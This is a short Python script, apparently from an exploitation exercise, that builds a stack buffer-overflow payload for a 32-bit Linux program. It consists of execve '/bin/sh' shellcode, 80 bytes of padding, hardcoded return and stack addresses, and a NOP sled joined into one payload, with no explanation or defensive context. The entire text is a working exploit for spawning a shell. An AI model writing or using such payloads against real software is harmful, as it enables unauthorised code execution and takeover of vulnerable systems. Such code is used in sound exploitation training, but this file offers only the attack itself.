

import struct 
shellcode=b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80'


padding=b'A'*80

ret_address = struct.pack('<I',0x080484f9) 

next_ret = struct.pack('<I',0xbffff7cc)

payload = padding + ret_address + next_ret + b'\x90'*40 + shellcode